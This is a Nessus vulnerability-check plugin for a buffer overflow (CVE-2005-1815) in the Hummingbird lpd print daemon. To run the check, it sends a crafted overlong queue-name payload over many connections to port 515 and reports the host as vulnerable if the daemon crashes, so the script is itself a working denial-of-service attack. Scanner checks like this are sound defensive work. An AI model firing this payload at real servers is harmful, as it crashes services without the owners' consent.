#
# (C) Tenable Network Security
#


if (description) {
  script_id(18403);
  script_version("$Revision: 1.3 $");
  script_cve_id("CVE-2005-1815");
  script_bugtraq_id(13788);

  name["english"] = "Hummingbird lpd Buffer Overflow Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The lpd daemon installed on the remote host appears to be from the
Hummingbird Connectivity suite and to suffer from a buffer overflow
vulnerability.  An attacker can crash the daemon by sending commands
with overly-long queue names and, with a specially-crafted packet,
even execute code remotely within the context of the affected service. 

Solution : None at this time.
Risk factor : High";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for buffer overflow vulnerability in Hummingbird lpd";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  script_dependencie("find_service.nes");
  script_require_ports("Services/lpd", 515);

  exit(0);
}


include("global_settings.inc");
if ( report_paranoia < 1 ) exit(0);

port = get_kb_item("Services/lpd");
if (!port) port = 515;
if (!get_port_state(port)) exit(0);


# Try to crash the remote lpd. (A working buffer overflow exploit
# is left as an exercise for the reader. :-)
exploit = raw_string(1)+ crap(1500) + raw_string(0x0A);
# nb: 'max' must be > 3 + maximum number of servers configured 
#     on the remote (default is 4).
max = 15;
for (i=1; i<=max; ++i) {
  soc[i] = open_priv_sock_tcp(dport:port);

  if (soc[i]) {
    send(socket:soc[i], data:exploit);
  }
  else {
    # If the first 2 connection attempts failed, just exit.
    if (i == 2 && !soc[1] && !soc[2]) {
      exit(0);
    }
    # Otherwise, there's a problem if the previous 2 attempts failed as well.
    else if (i >= 2 && !soc[i-1] && !soc[i-2]) {
      security_hole(port);
      break;
    }
    # Maybe the daemon is just busy.
    sleep(1);
  }
}


# Close any open sockets.
for (i=1; i<=max; i++) {
  if (soc[i]) close(soc[i]);
}
